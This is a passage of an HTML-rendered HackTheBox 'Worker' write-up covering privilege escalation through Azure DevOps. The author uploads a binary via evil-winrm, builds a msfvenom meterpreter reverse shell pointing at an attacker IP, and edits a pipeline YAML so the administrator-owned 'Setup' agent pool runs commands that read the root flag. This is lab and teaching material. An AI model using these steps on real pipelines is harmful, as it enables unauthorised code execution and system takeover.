---------------  --------  -----------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Payload options (windows/x64/meterpreter/reverse_tcp):</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   Name      Current Setting  Required  Description</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   ----      ---------------  --------  -----------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   LHOST     10.10.14.174     yes       The listen address (an interface may be specified)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   LPORT     9999             yes       The listen port</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Exploit target:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   Id  Name</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   --  ----</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0   Wildcard Target</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>[evil-winrm][evil-winrm]<!-- --> allows us to upload a file:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">*Evil-WinRM* PS C:\Users\robisl\Downloads&gt; upload /home/cyfun/CTF/HackTheBox/machines/Worker/cyfun.exe</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Info: Uploading /home/cyfun/CTF/HackTheBox/machines/Worker/cyfun.exe to C:\Users\robisl\Downloads\cyfun.exe</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Data: 680 bytes of 680 bytes copied</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Info: Upload successful!</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">*Evil-WinRM* PS C:\Users\robisl\Downloads&gt; pwd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Path</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">----</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">C:\Users\robisl\Downloads</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Now modify the template pipelien to</p><div class="language-yaml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-yaml codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Starter pipeline</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Start with a minimal pipeline that you can customize to build and deploy your code.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Add steps that build, run tests, deploy, and more:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># https://aka.ms/yaml</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token key atrule">trigger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">-</span><span class="token plain"> master</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token key atrule">pool</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;Default&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token key atrule">steps</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">-</span><span class="token plain"> </span><span class="token key atrule">script</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> C</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain">\Users\robisl\Downloads\cyfun.exe</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token key atrule">displayName</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;cyfun&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Then save and run to a new branch and PR to master.</p><p>When the pipeline ran I got an error:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">The pipeline is not valid. Could not find a pool with name Default. The pool does not exist or has not been authorized for use.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Going to <a href="http://devops.worker.htb/ekenas/PartsUnlimited/_settings/agentqueues" target="_blank" rel="noopener noreferrer">http://devops.worker.htb/ekenas/PartsUnlimited/_settings/agentqueues</a>
I was there was an Agent pool named <code>Setup</code> that was owner by the administrator.</p><p>So I changed my template to the following and created a new pipeline:</p><div class="language-yaml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-yaml codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Starter pipeline</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Start with a minimal pipeline that you can customize to build and deploy your code.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Add steps that build, run tests, deploy, and more:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># https://aka.ms/yaml</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token key atrule">trigger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">-</span><span class="token plain"> master</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token key atrule">pool</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;Setup&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token key atrule">steps</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">-</span><span class="token plain"> </span><span class="token key atrule">script</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> C</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain">\Users\robisl\Downloads\cyfun.exe</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token key atrule">displayName</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;cyfun&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Here is the execution of the pipeline task &quot;cyfun&quot;:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">##[section]Starting: cyfun</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">==============================================================================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Task         : Command line</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Description  : Run a command line script using Bash on Linux and macOS and cmd.exe on Windows</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Version      : 2.151.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Author       : Microsoft Corporation</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Help         : https://docs.microsoft.com/azure/devops/pipelines/tasks/utility/command-line</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">==============================================================================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Generating script.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Script contents:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">C:\Users\robisl\Downloads\cyfun.exe</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">========================== Starting Command Output ===========================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">##[command]&quot;C:\Windows\system32\cmd.exe&quot; /D /E:ON /V:OFF /S /C &quot;CALL &quot;w:\agents\agent11\_work\_temp\31fb30ee-8d29-41e3-9ab0-529b331cef0e.cmd&quot;&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">##[error]This version of C:\Users\robisl\Downloads\cyfun.exe is not compatible with the version of Windows you&#x27;re running. Check your computer&#x27;s system information and then contact the software publisher.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">##[error]Cmd.exe exited with code &#x27;1&#x27;.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">##[section]Finishing: cyfun</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Seems to be the wrong architecture.</p><p>So I created a 32 bits reverse shell instead of a 64 bits one:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows --encoder generic/none LHOST=10.10.14.174 LPORT=9999 -f raw &gt; cyfun.exe</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Found 1 compatible encoders</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Attempting to encode payload with 1 iterations of generic/none</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">generic/none succeeded with size 341 (iteration=0)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">generic/none chosen with final size 341</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Payload size: 341 bytes</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Same error again, ok let&#x27;s forget the shell, let&#x27;s just display the root
flag.</p><div class="language-yaml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-yaml codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token key atrule">trigger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">-</span><span class="token plain"> master</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token key atrule">pool</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;Setup&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token key atrule">steps</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">-</span><span class="token plain"> </span><span class="token key atrule">script</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> type C</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain">\Users\Administrator\Desktop\root.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token key atrule">displayName</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;cyfun&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Here are the logs of our pipeline task build:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">##[section]Starting: cyfun</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">==============================================================================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Task         : Command line</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Description  : Run a command line script using Bash on Linux and macOS and cmd.exe on Windows</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Version      : 2.151.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Author       : Microsoft Corporation</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Help         : https://docs.microsoft.com/azure/devops/pipelines/tasks/utility/command-line</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">==============================================================================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Generating script.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Script contents:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">type C:\Users\Administrator\Desktop\root.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">========================== Starting Command Output ===========================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">##[command]&quot;C:\Windows\system32\cmd.exe&quot; /D /E:ON /V:OFF /S /C &quot;CALL &quot;w:\agents\agent11\_work\_temp\d9359887-a4ac-49ad-9865-3e9b9024f109.cmd&quot;&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">c8d6aeda24c4e17abcc72f26dedbe919</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">##[section]Finishing: cyfun</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="theme-doc-footer-tags-row row margin-bottom--sm"><div class="col"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/security/">security</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/writeups/">writeups</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/htb/">htb</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/windows/">windows</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/pe/">pe</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/svn/">svn</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/azure/">azure</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/devops/">devops</a></li></ul></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/writeups/HackTheBox/Traverxec/write-up/"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Traverxec </div></a><a class="pagination-nav__link pagination-nav__link--next" href="/writeups/Tryhackme/0day/"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">0day</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#overview" class="table-of-contents__link toc-highlight">Overview</a></li><li><a href="#network-enumeration" class="table-of-contents__link toc-highlight">Network enumeration</a></li><li><a href="#http-enumeration" class="table-of-contents__link toc-highlight">HTTP enumeration</a></li><li><a href="#svn" class="table-of-contents__link toc-highlight">SVN</a></li><li><a href="#exploiting-azure-devops" class="table-of-contents__link toc-highlight">Exploiting Azure DevOps</a></li><li><a href="#privilege-escalation-of-machine--from-iis-apppooldefaultapppool-to-robisl" class="table-of-contents__link toc-highlight">Privilege Escalation of Machine : from iis apppooldefaultapppool to robisl</a></li><li><a href="#privilege-escalation-of-machine--from-robisl-to-administrator" class="table-of-contents__link toc-highlight">Privilege Escalation of Machine : from robisl to Administrator</a></li></ul></div></div></div></div></main></div></div><footer class="footer"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Support me</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/sponsors/S4CH" target="_blank" rel="noopener noreferrer" class="footer__link-item">Github<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Made with   ♥  by CyFun © 2023 
                            | Built on Docusaurus</div></div></div></footer></div>
<script src="/assets/js/runtime~main.3415e7ae.js"></script>
<script src="/assets/js/main.c90fa39a.js"></script>
</body>
</html>